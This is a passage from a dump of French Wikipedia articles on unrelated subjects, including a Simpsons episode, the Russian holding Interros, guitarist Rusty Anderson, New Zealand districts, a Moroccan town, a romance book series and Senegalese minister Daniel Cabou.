Krusty fait effacer au jet de sable son image de la fresque qui est sur le mur de la crèche de Maggie, car c'est une reproduction non autorisée de son image. En représailles, Homer le tue en le découpant dans un hachoir à branches, à la suite de quoi il se fait embaucher comme tueur de célébrités, pour permettre l'utilisation de leur image dans la publicité. Il tue ainsi George Clooney, Prince, Neil Armstrong. Ceux-ci redescendent du Paradis menés par Krusty et John Wayne et en compagnie de John Lennon et Golda Meir et tuent Homer en lui faisant sauter la tête d'un coup de fusil, qui monte au Paradis et ferme les portes de celui-ci et puis il part jouer au poker avec Abraham Lincoln. À noter que dans cet épisode John Fitzgerald Kennedy fait une apparition.
La grande citrouille (« It's the Grand Pumpkin, Milhouse »).
La troisième histoire est un clin d'œil à "It's the Great Pumpkin, Charlie Brown", un épisode spécial Halloween célèbre du dessin animé "Peanuts" avec Bart dans le rôle de Charlie Brown, Lisa en Sally Brown, Milhouse en Linus van Pelt, et Petit Papa Noël en Snoopy.
Milhouse attend dans le cimetière l'arrivée d'une citrouille géante. Quand la citrouille géante arrive, elle est scandalisée de voir comment l'homme découpe, déforme et mange les citrouilles et décide de se venger et de manger tout le monde. Milhouse, convaincu par Lisa, priera un dindon géant de sauver les gens. Ça sera ce dindon (Tom Turkey) à sauver les enfants de l'école de Springfield. Cependant, après avoir découvert par Bart que les humains mangent les dindons, le dindon se vengera en cherchant à manger les enfants de l'école
Audience américaine.
L'audience aux États-Unis a atteint lors de sa première diffusion 12,48 millions de téléspectateurs.
Une des plus fortes audiences depuis le 7 janvier 2007.
Cet épisode a atteint la plus forte audience depuis l'épisode Les Aqua-tics (Saison 18) diffusé pour la première fois aux États-Unis.

</doc>
<doc id="3214926" url="https://fr.wikipedia.org/wiki?curid=3214926" title="Patricia Cabot">
Patricia Cabot



</doc>
<doc id="3214931" url="https://fr.wikipedia.org/wiki?curid=3214931" title="Amanda Quick">
Amanda Quick



</doc>
<doc id="3214934" url="https://fr.wikipedia.org/wiki?curid=3214934" title="Interros">
Interros

Interros Holding Company est une entreprise russe créée en 1990, codirigée par deux milliardaires russes Vladimir Potanine et Mikhaïl Prokhorov. La holding Interros est une des plus importantes sociétés russes d’investissement. La capitalisation globale de ses avoirs a été estimée à 30 milliards de dollars en . La holding Interros représenterait à elle seule 1,4 % du PIB de la Russie.
Histoire de création.
À l’époque de la perestroïka Vladimir Potanine saisit l’opportunité pour quitter l’appareil d’État de commerce extérieur et se lancer, parmi les tout premiers, dans le secteur naissant privé. En 1990, grâce aux relations de son père, il réussit à créer une association privée de commerce extérieur Interros. Cette date figure comme date de création de la holding Interros. Cependant les informations habituellement connues sur les sociétés occidentales ne sont pas toutes accessibles concernant Interros et d'autres entreprises russes selon www.forbes.com, car Boris Eltsine a avantagé certains chefs d'entreprises dans le chaos politique de 1991.
La Société générale a contribué à la consolidation de l'entreprise en 2006 et en (10 % de Rosbank).
Interros holding company.
Interros est un vaste conglomérat industriel bâti autour de Rosbank et du géant des métaux Norilsk Nickel, qui s'est diversifié dans l'agroalimentaire, les médias, les turbines ou l'extraction aurifère.
Interros est un grand groupe industriel russe, qui établit ses comptes en IFRS [NDLR : normes comptables internationales] et dont la valeur dépasse les 20 milliards de dollars. Ses activités minières, dans le nickel notamment, le mettent en compétition avec des opérateurs canadiens ou australiens.
Restructuration de Interros en 2007-2008.
Après une brève arrestation très médiatisée de Mikhaïl Prokhorov à Courchevel en janvier 2007 dans le cadre d’une enquête sur un réseau présumé de prostitution, les relations entre les deux partenaires se sont envenimées. Même si cette enquête judiciaire n’a jamais abouti à quoi que ce soit, elle a servi à Vladimir Potanine de prétexte officiel pour engager une procédure de « divorce » économique d’avec Mikhaïl Prokhorov. 
Officiellement, l’intention des copropriétaires de la holding Interros Vladimir Potanine et Mikhaïl Prokhorov de « restructurer les actifs du groupe » a été expliquée comme due à « leurs visions différentes de sa stratégie de développement ».
Dans le cadre de cette restructuration, Mikhaïl Prokhorov, codirigeant du géant minier russe Norilsk Nickel, devait revendre ses parts à son partenaire Vladimir Potanine (chacun des deux entrepreneurs détenait 27,39 % des titres de Norilsk Nickel) pour se lancer dans les énergies alternatives et créer sa propre compagnie pour gérer ses actifs. Mikhaïl Prokhorov a quitté ses fonctions de directeur général de Norilsk Nickel. Vladimir Potanine est resté propriétaire d’Interros, holding qui contrôle la compagnie. 
Les deux oligarques devaient demeurer malgré tout copropriétaires des autres activités d’Interros, à savoir le producteur d’or Polyus Gold, la Rosbank, le fabricant de turbines Silovye Machiny et le groupe médias Prof-Média.
Cette procédure est très complexe et donne depuis 2007 lieu à plusieurs litiges entre les deux milliardaires.
Luttes d’influences après la restructuration en 2007-2008.
Le groupe russe Rusal et la holding Interros, principaux actionnaires du groupe minier Norilsk Nickel, ont indiqué être venus à bout du conflit qui paralysait l'entreprise depuis plusieurs mois.
Les deux groupes, détenus respectivement par les hommes d'affaires Oleg Deripaska et Vladimir Potanine, « ont conclu un accord de coopération au sujet de Norilsk Nickel, afin de rétablir la valeur de l'entreprise et de contribuer à sa croissance dynamique », indiquent-ils dans un communiqué.
Rusal détient 25 % plus deux actions de Norilsk Nickel, acquises au début de l'année auprès du milliardaire Mikhaïl Prokhorov à la suite du scandale à Courchevel en . La part de Vladimir Potanine dans Norilsk Nickel est estimée à environ 30 %.
La lutte d'influence entre MM. Potanine et Deripaska durait depuis des mois, qu'il s'agisse de la gouvernance et de la direction du groupe, de sa stratégie, ou du montant exact de leurs parts respectives dans le groupe.
Acquisition de Rosbank.
Le , la Société générale annonce qu'elle cède sa filiale Rosbank à Interros, en plein conflit ukrainien. Cette transaction coûte 3,1 milliard d'euros à la Société générale. Pourtant les résultats positifs de l'exploitation de Rosbank représentaient environ 2% du bénéfice d'exploitation du groupe français, mais l'opinion publique occidentale ne comprenait pas qu'une banque française puisse opérer une filiale en Russie alors que les pluies de sanctions tombaient sur la Russie.
Interros - membre du Pacte mondial des Nations unies en Russie.
La holding Interros fait partie des membres du Pacte mondial de l’ONU en Russie. À ce jour, il existe 24 membres du Pacte en Russie, dont d’autres grandes entreprises comme la Société russe unie d'aluminium, les chemins de fer russes, Renova, Sistema et l'Union des industriels et entrepreneurs russes.
Le Pacte mondial pour la Russie a été lancé par le Secrétaire général de l'ONU, Ban Ki-moon, le lors d'une réunion comptant plus de 30 des plus importants hommes d'affaires dans le pays, dont le président de Interros Vladimir Potanine. 
Le Pacte mondial est un cadre établi par les Nations unies avec les entreprises, par lequel elles acceptent d'aligner leurs stratégies et leur fonctionnement sur dix principes de base dans les domaines des droits de l'homme, du travail, de l'environnement et de la lutte contre la corruption. Ban Ki-moon a estimé que le lancement du Pacte en Russie montrait que « les entreprises russes, qui représentent une des plus importantes économies dans le pays, étaient prêtes à promouvoir les valeurs universelles des Nations unies ».

</doc>
<doc id="3214936" url="https://fr.wikipedia.org/wiki?curid=3214936" title="Ai Senshi Nicol">
Ai Senshi Nicol

 est un jeu vidéo d'action sorti en 1987 sur Famicom Disk System. Le jeu a été développé et édité par Konami.

</doc>
<doc id="3214939" url="https://fr.wikipedia.org/wiki?curid=3214939" title="Rusty Anderson">
Rusty Anderson

Rusty Anderson, né le à La Habra, Californie, est un guitariste, compositeur et producteur américain. Il est le guitariste de Paul McCartney depuis le début des années 2000, bien qu'il ait travaillé avec un grand nombre de musiciens, parallèlement à sa carrière solo.
Biographie.
Les premières années.
Rusty Anderson a grandi à La Habra en Californie. Son père lui a donné sa première guitare électrique lorsqu'il avait 8 ans. Anderson a immédiatement créé un groupe avec des amis d'école. Fort de sa passion pour The Beatles, Genesis, The Mothers of Invention, David Bowie et The Who, cette obsession ne s'est jamais arrêtée. Son premier groupe fut Eulogy. À 13 ans, il choisit des membres (incluant Dirk Vantatenhove, Myles Crawley, Ross Holly et Mike Jones alias Zallen) qui étaient ensemble dans d'autres groupes pendant 6 ans. Ils ont partagé la scène avec The Police, Van Halen, Quiet Riot et The Motels pour en nommer quelques-uns. Eulogy a également loué ses talents à la chanteuse et actrice Ronee Blakley pour le film de Wim Wenders intitulé I Played It For You.
Studio et Live.
Après la fin d'Eulogy, Rusty Anderson poursuivit sa passion des spectacles vivants et de l'enregistrement en studio. Il forma The Living Daylights, avec Gregory Markel et John "Gogo" Kallas, qui sortit un album sur le label Greenworld. Ce fut le premier groupe où Rusty occupa le poste de compositeur. The Living Daylights fut démantelé lorsqu'il signa avec Columbia Records. Bien que l'album pour Columbia ne soit jamais sorti, un lien fut créé avec le producteur David Kahne. Présenté par Eulogy et Mike Jacobs, manager de The Living Daylights, Kahne l'invita en studio pour jouer sur le second album de The Bangles, "Different Light". Cela lui ouvrit les portes de ce qui suivit. Bien qu'il ne se soit jamais vu comme musicien de session, Rusty Anderson commença à jouer de la guitare avec des artistes comme Fishbone, Matthew Sweet, Neil Diamond, Animal Logic (Stewart Copeland et Stanley Clarke), Little Richard, Parthenon Huxley et Carole King.
Ednaswap.
Rusty Anderson fut invité par les compositeurs Scott Cutler et Anne Preven à rejoindre un nouveau groupe - - avec Paul Bushnel et Carla Azar. Le groupe signa avec East West/Elektra Records. Le groupe enregistra quatre disques et écrivit le succès Torn, interprété par Natalie Imbruglia. Après beaucoup de tournées et d'enregistrements, Ednaswap se sépara.
Retour au studio.
Rusty Anderson retourna alors en studio pour travailler et enregistrer avec d'autres artistes pendant une période très fructueuse. Elton John, The New Radicals, Willie Nelson, Sinead O'Connor, The Wallflowers, Jewel, Santana, Stevie Nicks, Ronan Keating et Joe Cocker sont quelques-uns de ces artistes. Simultanément, Rusty Anderson écrivait des chansons pour conserver sa propre créativité. Le fruit de ce travail se retrouvera sur son premier album.
Paul McCartney.
Comme le batteur Abe Laboriel Jr., Rusty Anderson fut appelé par David Kahne pour jouer et chanter sur l'album de Paul McCartney "Driving Rain". Ce fut la création du groupe de scène de McCartney. Après avoir fini l'enregistrement et joué au Concert for New York City avec The Rolling Stones, David Bowie, The Who (et bien d'autres), le groupe de McCartney (incluant également Brian Ray et Paul Wickens) partit en tournée, laquelle fut acclamée par les critiques. Ils ont ainsi joué aux États-Unis, au Japon, au Mexique et en Europe, totalisant une centaine de concerts, dont le concert au Colisée, le Live 8 et la Place Rouge à Moscou. Du fait du succès de ces concerts, des CD et DVD sont sortis : "Back in the U.S.", "Back in the World", ' et '. En plus de l'album studio "Driving Rain", Anderson a joué de la guitare et chanté sur l'album "Memory Almost Full" et de la guitare sur "Chaos and Creation in the Backyard". Dans les années 2010, Rusty Anderson et le groupe de Paul McCartney sont régulièrement en tournées mondiales. Ils jouent ensemble depuis presque 20 ans.
Enregistrements Solo.
Alors que la plupart de ses chansons étaient écrites et enregistrées pour son album, "Undressing Underwater", Rusty Anderson invita McCartney et le reste du groupe à le rejoindre pour jouer sur le morceau "Hurt Myself". McCartney joua de la basse et chanta les secondes voix. Stewart Copeland, un ami de Rusty Anderson, joue de la batterie sur Catbox Beach. Le CD est sorti sur Surfdog Records, iTunes et Amazon. Rusty Anderson est sur le point de sortir son second album solo.
Autres Artistes.
En plus de participer à des concerts pour faire la promotion de son album, Anderson a continué à jouer de la guitare avec d'autres artistes comme Gwen Stefani, Steven Tyler, Regina Spektor, Dido, Cat Stevens (Yusuf Islam), Miley Cyrus, Eros Ramazzotti, Nelly Furtado, Meatloaf, Robi Draco Rosa et Lisa Marie Presley. Anderson ecrit non seulement pour lui mais a également produit et écrit pour Chris Shaffer de The Why Store, Jordan Lawhead et Emma Burgess dont les chansons furent retenues pour des séries télévisées comme ', ', "Kyle XY" et "Wildfire". Anderson a également joué les parties de guitares sur le hit international "Livin' la Vida Loca".

</doc>
<doc id="3214941" url="https://fr.wikipedia.org/wiki?curid=3214941" title="Égouts">
Égouts



</doc>
<doc id="3214944" url="https://fr.wikipedia.org/wiki?curid=3214944" title="Mam'zelle Cri-Cri">
Mam'zelle Cri-Cri

Mam'zelle Cri-Cri ("Die Deutschmeister") est un film autrichien réalisé par Ernst Marischka, sorti en 1955
Synopsis.
Vers 1900, Constanze Hübner, jeune paysanne des environs de Salzburg, vient à Vienne chez sa tante Thérèse, boulangère de l'Empereur François-Joseph. Un quiproquo permet à Constanze, surnommée Cricri, d'assister à un bal costumé où le baron Felix Zorndorf la confond avec une authentique comtesse et la demande en mariage.

</doc>
<doc id="3214945" url="https://fr.wikipedia.org/wiki?curid=3214945" title="Die Deutschmeister">
Die Deutschmeister



</doc>
<doc id="3214949" url="https://fr.wikipedia.org/wiki?curid=3214949" title="District de Franklin">
District de Franklin

Le district de Franklin est une ancienne municipalité au sud d'Auckland, dans l'île du Nord de la Nouvelle-Zélande. Depuis 2010, la municipalité n'existe plus et ses quartiers ont été ajoutés à la ville d'Auckland, dirigé par le conseil d'Auckland. Le nom n'a pas changé en revanche, Franklin est aujourd'hui un des 13 districts de la ville d'Auckland. 
Géographie.
Le district, s'étendant sur 2187,94 km, est divisé entre les régions d'Auckland (qui abrite 39,82 % de la superficie du district), et de Waikato (60,18 %). Il était administré à partir de la ville de Pukekohe de la région d'Auckland. Le district est surtout rural mais abrite quelques petits établissements, dont Waiuku et Tuakau.
Le district est bordé au nord par le début de la zone métropolitaine d'Auckland et les eaux de la baie de Manukau. La péninsule Awhitu s'étend le long de la côte de la mer de Tasman jusqu'à l'embouchure de cette baie. On y trouve quelques stations balnéaires, dont Kariotahi Beach et Matakawau. Au sud on trouve les plaines du Waikato et à l'est les collines menant jusqu'aux monts Hunua ; à l'est des monts il y a la côte du Firth of Thames. À l'ouest se situe la mer de Tasman.
L'embouchure du fleuve Waikato se trouve à Port Waikato, au sud du district.
Démographie.
Au recensement de 2006, on y comptait habitants. Les récentes estimations de 2012 comptent 65 200 habitants.La superficie est de 187,94 km². La densité y est de 30 habitants par km². 

</doc>
<doc id="3214962" url="https://fr.wikipedia.org/wiki?curid=3214962" title="Alasdair gray">
Alasdair gray



</doc>
<doc id="3214963" url="https://fr.wikipedia.org/wiki?curid=3214963" title="Zeghanghane">
Zeghanghane

Zeghanghane (en berbère: ⴰⵣⵖⴰⵏⵖⴰⵏ) est une ville marocaine de la province de Nador. Elle se situe à à l’ouest de la ville de Nador et occupe l'est de la région tribale de Gelaya (en berbère : "Iqeřεiyen"). La superficie de la ville est de et sa population est estimée à habitants en 2018.
La ville a été secouée par un scandale en août 2025, à la suite du mariage d'un baron de la drogue surnommé Moussa : hommes masqués, voitures luxueuses dont la lunette arrière était décorée d’images d’épées croisées dans une démonstration de force, usage dangereux d’armes de chasse dans la voie publique. La BNPJ a ouvert une enquête approfondie a ce sujet.
Présentation.
La ville de Zeghanghane constitue le deuxième bout de l’axe Ennaḍor-Azɣenɣan réputé pour sa grande activité commerciale et aussi pour son développement urbain.
La situation géographique de la ville de Zeghanghane fait d’elle un point d’intersection pour les communes rurales : Iḥeddaden, Ayt Sidař en Wedrar, Ayt Buyefrur et Iksan. Et vu son importance économique, surtout commerciale, Zeghanghane est considérée comme un centre urbain qui satisfait presque tous les besoins des habitants des communes riveraines en ce qui concerne l’approvisionnement et les services.
La ville de Zeghanghane possède trois accès principaux :
La rocade Essɛidiya-Ṭanja traverse la municipalité.
La ville est entourée de massifs de montagnes dont le plus haut est le plus important est Azrouhammar qui donne à la ville un attrait spécial.
Au centre de la ville, se trouve un jardin public qui ressemble beaucoup aux jardins de l'Andalousie. Pas loin de ce jardin on trouve la pépinière des eaux et forêts qui s’étend sur plusieurs hectares. À sa limite dans le nord, on trouve la source « Ibouyan » dont l'eau est vivement apprécié par un nombre important des habitants de toute la province. L'eau de cette source est très abondante et permet l'irrigation de plusieurs petits champs.
Sur le plan historique, la ville de Zeghanghane est très réputée pour sa résistance à l'occupation espagnole. L'histoire retient vivement l'action anti-coloniale menée par le militant Charif Mohamed Améziane qui a dirigé plus de cent batailles contre le colonisateur jusqu'à sa mort le .

</doc>
<doc id="3214970" url="https://fr.wikipedia.org/wiki?curid=3214970" title="District de Franklin (Nouvelle-Zélande)">
District de Franklin (Nouvelle-Zélande)



</doc>
<doc id="3214971" url="https://fr.wikipedia.org/wiki?curid=3214971" title="Franklin District">
Franklin District



</doc>
<doc id="3214981" url="https://fr.wikipedia.org/wiki?curid=3214981" title="Lavage d'estomac">
Lavage d'estomac



</doc>
<doc id="3214984" url="https://fr.wikipedia.org/wiki?curid=3214984" title="Selma Bajrami">
Selma Bajrami

Selma Bajrami (née le à Tuzla, Yougoslavie, aujourd'hui Bosnie-Herzégovine) est une chanteuse pop-folk bosniaque.
Biographie.
Selma Bajrami est née d'un père albanais du Kosovo, qui s'installa en Bosnie-Herzégovine en 1965, et d'une mère bosniaque de Tuzla.
Carrière.
Son premier album "Kad suza ne bude" fut écrit et composé par Milic Vukacinovic et produit dans le studio "Time" à Belgrade (Serbie). Son deuxième album - "Ljubav si ubio gade" (1998) - fut réalisé dans le studio de Misa Nikolic. Après son troisième album - "Revolucija" - qui fut également un échec, Selma se retira de la scène musicale.
Selma Bajrami fit son retour sur la scène musicale avec son quatrième album - intitulé "Žena sa Balkana" - dont le style musical était complètement différent des précédents. Réalisé par Dejan Abadic et comportant des titres comme "Nano", cet album a enfin permis de lancer avec succès la carrière de la chanteuse.
Selma Bajrami a connu un nouveau succès, en 2006, grâce à son single "Kakvo tijelo Selma ima" (Quel corps Selma a) qui se hissa rapidement en haut des classements dans l'ensemble des États issus de l'ex-Yougoslavie.

</doc>
<doc id="3214987" url="https://fr.wikipedia.org/wiki?curid=3214987" title="Patrice Dozier">
Patrice Dozier

Patrice Dozier, né le à Bois-Grenier, dans le Nord, est un acteur français.
Spécialisé dans le doublage, il est, entre autres, la voix française récurrente de Wallace Shawn et Leslie Jordan, ainsi que celle de l'inspecteur Brackenreid (Thomas Craig) dans "Les Enquêtes de Murdoch". Dans l'animation, il est surtout connu pour être la voix d'Elmer Fudd dans les "Looney Tunes" depuis 1997, dans "Les Griffin" et plusieurs personnages Disney tels que Hermès dans "Hercule" ou (depuis "Peter Pan 2").

</doc>
<doc id="3215005" url="https://fr.wikipedia.org/wiki?curid=3215005" title="Bagani">
Bagani



</doc>
<doc id="3215009" url="https://fr.wikipedia.org/wiki?curid=3215009" title="Aventures et Passions">
Aventures et Passions

Aventures et Passions est une collection littéraire française de romances historiques créée en 1991 par les éditions J'ai lu. Chaque titre se vend autour de exemplaires.
Genèse.
En 1990, Jacques Sadoul, alors directeur littéraire aux éditions "J'ai lu", décide de lancer une nouvelle collection de romans sentimentaux qui n'existait pas en France. Depuis quelques années, il avait constaté qu'un nouveau style de romans d'amour au succès croissant avait fait son apparition dans les foires aux livres internationales, notamment la Foire du livre de Francfort. Il était frappé par les couvertures agressives qui tranchaient avec les dessins qui prédominaient jusqu'ici dans la littérature sentimentale : couple enlacé, attitude lascive, torse masculin dénudé ou décolleté plongeant pour la femme, etc. Surnommées « » aux États-Unis, ces romances historiques se caractérisaient par des héroïnes indépendantes qui évoluaient dans d'autres époques tout en conservant la mentalité d'une femme du .
Estimant que le succès que rencontraient ces romans aux États-Unis pouvait connaître le même écho en France, Jacques Sadoul soumit son idée au service commercial des éditions "J'ai lu". Celui-ci s'y opposa dans un premier temps, arguant du fait que les lectrices françaises ne pourraient jamais accepter un tel concept. Une étude de marché fut donc mise en place pour évaluer le potentiel commercial d'une éventuelle collection et les goûts des lectrices françaises. Elle révéla qu'elles étaient prêtes à acheter ce nouveau style de romans mais sans adhérer totalement à des couvertures en relief comme cela se faisait aux États-Unis. Jacques Sadoul obtint l'autorisation de confier la direction de cette nouvelle collection à la personne de son choix. Il engagea donc Béatrice Duval, parfaitement bilingue.
Succès et concurrence.
Le , la collection "Aventures et Passions" est donc lancée, avec des couvertures moins provocantes. Les six premiers romans paris sont : "Les Yeux de velours" de Jude Deveraux, "Esclave et châtelaine" de Johanna Lindsey, "Désirs fous" de , "Le Quiproquo de minuit" de Shirlee Busbee, "Esclave de soie" de Nan Ryan et "La Fiancée du désert" de Joanne Redd. Les couvertures sont réalisées à la main et à la gouache par l'illustrateur français Michel Gourdon.
Le succès est immédiat puisque dès la première année, les ventes des 32 titres publiés atteignent un million d'exemplaires et six mois plus tard, elles approchent des deux millions. Chaque roman se vend à environ exemplaires. En 2012, la collection comprend 800 titres et comptabilise 20 millions d'exemplaires vendus.
À la même époque, leur principal concurrent, les éditions Harlequin, publiait également des romances historiques dans leur collection "Royale". Toutefois, ces romans avaient un format plus court (150 pages maximum) ainsi que des histoires et des couvertures plus sages. En 1992, Harlequin lance "Les Historiques", une collection similaire à "Aventures et Passions", sans toutefois aller jusqu'à exposer des couples peu vêtus sur leurs couvertures.

</doc>
<doc id="3215015" url="https://fr.wikipedia.org/wiki?curid=3215015" title="Tezuka awards">
Tezuka awards



</doc>
<doc id="3215017" url="https://fr.wikipedia.org/wiki?curid=3215017" title="Tezuka Awards">
Tezuka Awards



</doc>
<doc id="3215018" url="https://fr.wikipedia.org/wiki?curid=3215018" title="Daniel Cabou">
Daniel Cabou

Daniel Cabou, né le , est un homme politique sénégalais, plusieurs fois ministre et ancien Secrétaire général de la Banque centrale des États de l'Afrique de l'Ouest (BCEAO).
Biographie.
Né à Mandina, en Casamance, il fait ses études à l'Université de Dakar où il obtient un certificat d’Études littéraires générales classiques, premier certificat de licence en Droit et deuxième certificat de licence de Droit puis au Lycée Louis Le Grand où il prépare le Concours A d’entrée à l’École Nationale de la France d’Outre-Mer (1952-1953) qu'il reçoit le 9 juillet 1953.
Cette réussite au Concours A d’entrée à l’École Nationale de la France d’Outre-Mer lui vaut l’honneur d’être reçu à déjeuner, en tête à tête, à l’occasion de ses vacances à Dakar, par le Gouverneur Général de l’AOF au Palais. Il est, dit-on, le premier Africain Noir, non mulâtre, ni métis, à être reçu à ce concours A.
Il est enregistré à l’École Nationale de la France d’Outre-Mer sous le numéro 2838 du Cycle A. Membre de la Garde d’Honneur du Drapeau de l’École Nationale de la France d’Outre-Mer, Promotion 1953, il est affecté en Côte d’Ivoire avec quatre de ses camarades de la Promotion 1953. Le Gouverneur Pierre Messmer, l’affecte d’abord à Odienné où il sert sous les ordres de Joseph Vezy, administrateur en Chef de la France d’Outre-Mer puis, de son successeur à Odienné, Michel Guerpillon.
Pierre Messmer l'affecte ensuite à Abidjan où il sert au service de la Coopération et Mutualité Agricole sous les ordres d'Alexandre Tanguy, administrateur en Chef de la France d’Outre-Mer.
Durant sa scolarité à l’École Nationale de la France d’Outre-Mer, il est fortement marqué par ses professeurs, notamment par Leopold Sedar Senghor (1954-1956).
En 1956, il effectue un stage de spécialisation au Siège de la Banque Internationale pour le Commerce et l’Industrie, Boulevard des Italiens à Paris, avec des camarades de sa promotion.
Il étudie ensuite à la Faculté de Droit et de Sciences Économiques de Paris où il obtient une licence en Droit puis un Doctorat d’État en Sciences Économiques.
Avant l’Indépendance du Sénégal, il sert comme Administrateur de la F.O.M. au Sénégal, et occupe les fonctions suivantes :
Pendant la période d’Autonomie Interne du Sénégal, Mamadou Dia, alors Vice Président du Conseil du Gouvernement demande à la France son détachement auprès du Gouvernement du Sénégal. La France donne son accord. Il est alors nommé successivement :
Après l’Indépendance du Sénégal , en 1961, il doit choisir entre rester fonctionnaire français et repartir en France comme Administrateur Civil, ou nommé dans les Grands Corps de l’État, ou alors, rester au Sénégal et choisir la fonction publique sénégalaise. Il choisit de rester au Sénégal et démissionne de la fonction publique française en 1962
Directeur de cabinet du Ministre des Finances, André Peytavin, (décembre 1961-12 novembre 1962), Secrétaire d’État chargé de l’Hydraulique, de l’Urbanisme et de l’Habitat de novembre 1962 à décembre 1962 puis Secrétaire d’État aux Finances et aux Affaires Économiques de décembre 1962 au 6 février 1963, il devient Ministre des Finances de février 1963 à février 1964, Membre du conseil d’administration de la B.C.E.A.O., et Président du Comité Monétaire National.
Ministre du Commerce et de l’Industrie et de l’Artisanat de février 1964 à mars 1968, membre du Comité Monétaire National, Président du Conseil Africain de l’Arachide, dont le siège est à Lagos au Nigeria, et Président du Conseil d’Administration de l’Office africain et Malgache de la Propriété Industrielle dont le siège est au Cameroun, il est Ministre Secrétaire Général de la Présidence de la République du Sénégal du 7 mars 1968 à mars 1970.
Ministre du Développement Industriel et Président du Conseil des Ministres de l’Organisation des États Riverains du Fleuve Sénégal (OERS) dirigée par Ould Dadah, de mars 1970 à juillet 1972, date à laquelle sur demande expresse et pressante de obert Julienne, Inspecteur Général des Finances, Directeur Général de la Banque Centrale des États de l’Afrique de l’Ouest, et après acceptation de la demande par le Président Léopold Sédar Senghor, Président de la République, il est mis en position de détachement auprès de la B.C.E.A.O à compter du août 1972 comme Directeur Général adjoint de la B.C.E.A.O., en remplacement de Marcel Boyer, Inspecteur Général de la France d’Outre Mer. Il cumule cette fonction avec celle de Secrétaire Permanent du Comité des Ministres des Finances, chargé de la réforme des Institutions de l’Union Monétaire Ouest Africaine, présidé par le Ministre Marc Garango, Ministre des Finances de Haute-Volta, de décembre 1972 au 14 février 1975 date de la mise en place des nouvelles structures de la BCEAO, de l’Union Monétaire Ouest Africaine et de l’installation de la BOAD avec toutes ses structures.
Il est Secrétaire général de la B.C.E.A.O, de 1975 à 1984, avec en plus la responsabilité provisoire du Bureau de Paris de la B.C.E.AO. en attendant la nomination du délégué titulaire intervenue le 16 juin 1980. Délégué du Gouverneur de la B.C.E.A.O. au bureau de Paris, de 1984 à 1989, date de son départ à la retraite, il est nommé en 1991 Conseiller Spécial, puis Ministre Conseiller Spécial des Premiers Ministres Habib Thiam, Mamadou Lamine Loum et Moustapha Niasse.
Le 12 novembre 1994, il est nommé par le Gouverneur de la B.C.E.A.O, Charles Konan Banny, membre du Comité Historique chargé de rédiger l’ouvrage "Histoire de l’Union Monétaire Ouest Africaine des Origines à nos jours". Il préside ce Comité Historique.
Cet ouvrage en trois tomes est publié par la B.C.E.A.O. en 2000 en version française et en 2002 en version anglaise

</doc>
<doc id="3215019" url="https://fr.wikipedia.org/wiki?curid=3215019" title="District de Thames-Coromandel">
District de Thames-Coromandel

Le district de Thames-Coromandel est situé dans la péninsule Coromandel et autour du Firth of Thames, au sud-est d'Auckland, dans l'île du Nord de la Nouvelle-Zélande. Il s'étend sur km.
Selon le recensement de 2006 le district abrite habitants, dont à Whitianga, à Coromandel, et à Whangamata.
Son conseil du district est sis à Thames, et fut créé en 1989 lors de la fusion des conseils des comtés de Thames et de Coromandel.

</doc>
<doc id="3215020" url="https://fr.wikipedia.org/wiki?curid=3215020" title="Quartier de l'Orangerie (Strasbourg)">
Quartier de l'Orangerie (Strasbourg)

Le quartier de l'Orangerie est un quartier de Strasbourg.
Administrativement, il est regroupé avec le quartier du Conseil des XV pour former l'ensemble Orangerie - Conseil des XV.
Localisation.
Le quartier se situe au nord-est de la Grande Île, le centre historique de la ville, et fait partie de la Neustadt.
Il est délimité à l'est par le quartier du Conseil des XV, au nord-ouest par le Wacken, au nord-est par la Robertsau, au sud-ouest par le quartier Centre - République.
Ce quartier est célèbre pour les institutions européennes qui y sont installées, notamment le Conseil de l'Europe et le Parlement Européen.
Essentiellement résidentiel, l'Orangerie est le quartier qui abrite le plus grand nombre de consulats et de représentations diplomatiques de la ville.
Son nom lui vient du parc de l'Orangerie.
Résidents et niveau de vie.
Le quartier de l'Orangerie est très recherché par les hauts fonctionnaires (diplomates, inspecteurs des finances...), les professions libérales (architectes, notaires, avocats...) et les familles bourgeoises de Strasbourg.
Cet attrait s'explique par l'architecture de style germanique de la fin du XIX siècle du quartier mais également par la proximité des institutions européennes et les nombreuses représentations diplomatiques (consulats).
L'Orangerie est également le quartier possédant la plus grande surface d'espaces verts de la ville avec le parc de l'Orangerie d'une superficie de 26 hectares.
En 2009, les prix du quartier y sont les plus élevés de Strasbourg avec un prix au mètre carré pouvant aller jusqu'à 4 500 € pour un bien doté d'une vue sur le parc.
Transports en commun.
Les stations "Universités" et "Observatoire" des lignes de tramway C, E et F se trouvent au sud du quartier, sur le boulevard de la Victoire.
Le quartier est par ailleurs parcouru par plusieurs lignes de bus : C1, 2, C6, 15, 30, 72 et N2.

</doc>
<doc id="3215021" url="https://fr.wikipedia.org/wiki?curid=3215021" title="Domenico Ponsello">
Domenico Ponsello

Domenico Ponsello, né à Pieve di Teco dans la province d'Imperia (Ligurie) au début du , est un architecte et un ingénieur militaire italien du .
Biographie.
Domenico Ponsello se forme vraisemblablement dans des ateliers d’architectes à Gênes et Turin. Il est avant tout un ingénieur militaire, mais il intervient aussi dans la construction d’édifices civils et religieux. Il est actif principalement dans sa région natale et dans le Piémont.
Ses réalisations les plus importantes se font entre les années 1556 et 1574. À Gênes, dès 1556, il collabore à l’érection de l’église Santa Maria in Carignano. De 1560 à 1563, avec son frère Giovanni, il construit la villa de Vincenzo Imperiale, dite la « Bellezza ». En 1565, à l’ouest de Gênes, il termine la , dite la « Fortezza ». La même année et pendant plus d’une décennie, de nouveau avec son frère, il bâtit le monumental palais Doria-Tursi, aujourd’hui hôtel de ville génois, et la façade du Palazzo Bianco. Présent dans le Piémont entre 1563 et 1565, sous la direction de Francesco Paciotto, il contribue à la fortification de Coni et à l’édification de la citadelle de Turin. Lors de ses séjours dans le comté de Nice entre 1557 et 1572, il réalise le dessin et la construction du fort du mont Alban, et dirige avec d’autres ingénieurs les chantiers des forteresses de Nice et de Villefranche-sur-Mer. Le , Domenico Ponsello est anobli par le duc Emmanuel-Philibert de Savoie. Après 1589, les archives ne mentionnent plus son nom.

</doc>
<doc id="3215024" url="https://fr.wikipedia.org/wiki?curid=3215024" title="Éric Lamaze">
Éric Lamaze

Éric Lamaze, né le à Montréal, est un cavalier canadien et champion olympique de saut d'obstacles. Il est jusqu'à présent le seul cavalier canadien à avoir gagné une médaille d'or dans cette discipline aux Jeux Olympiques.
Lamaze est demeuré premier cavalier du classement FEI pendant trois ans après les Jeux olympiques de Pékin. En 2016, Lamaze est au classement mondial.
Biographie.
Enfance et adolescence.
